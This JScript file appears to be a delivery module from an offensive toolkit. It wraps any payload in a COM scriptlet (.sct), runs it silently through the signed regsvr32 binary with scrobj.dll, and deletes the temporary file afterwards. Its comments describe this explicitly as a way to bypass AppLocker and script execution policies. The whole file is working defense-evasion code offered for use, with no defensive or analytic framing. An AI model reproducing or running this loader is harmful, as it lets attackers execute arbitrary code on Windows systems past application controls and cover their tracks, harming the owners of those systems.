// chunk: delivery/sct_scriptlet
// depends: (none)
// provides: sct_execute
// format: jscript
// note: COM scriptlet (.sct) execution via regsvr32 LOLBin. Wraps the JScript
//       payload in a Windows Script Component (.sct) file and executes it using
//       regsvr32.exe /s /n /u /i:<path>.sct scrobj.dll. regsvr32 is a signed
//       Windows binary that bypasses AppLocker and most script execution policies.

function sct_execute(payload_code, output_path) {
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var sh = new ActiveXObject("WScript.Shell");
    var tmp = output_path || (fso.GetSpecialFolder(2).Path + "\\" +
              Math.random().toString(36).substring(2, 8) + ".sct");

    var sct_content =
        '<?XML version="1.0"?>\r\n' +
        '<scriptlet>\r\n' +
        '  <registration\r\n' +
        '    progid="TESTING"\r\n' +
        '    classid="{' + _gen_guid() + '}"\r\n' +
        '  >\r\n' +
        '    <script language="JScript">\r\n' +
        '      <![CDATA[\r\n' +
        payload_code + '\r\n' +
        '      ]]>\r\n' +
        '    </script>\r\n' +
        '  </registration>\r\n' +
        '</scriptlet>';

    var f = fso.CreateTextFile(tmp, true);
    f.Write(sct_content);
    f.Close();

    /* regsvr32 /s /n /u /i:<sct_path> scrobj.dll
       /s = silent, /n = don't call DllRegisterServer, /u = unregister (calls
       DllUnregisterServer which triggers the scriptlet), /i = install path */
    sh.Run('regsvr32 /s /n /u /i:"' + tmp + '" scrobj.dll', 0, true);

    WScript.Sleep(1000);
    try { fso.DeleteFile(tmp); } catch(e) {}
}

function _gen_guid() {
    var hex = "0123456789ABCDEF";
    var parts = [8, 4, 4, 4, 12];
    var guid = "";
    for (var p = 0; p < parts.length; p++) {
        if (p > 0) guid += "-";
        for (var i = 0; i < parts[p]; i++) {
            guid += hex.charAt(Math.floor(Math.random() * 16));
        }
    }
    return guid;
}
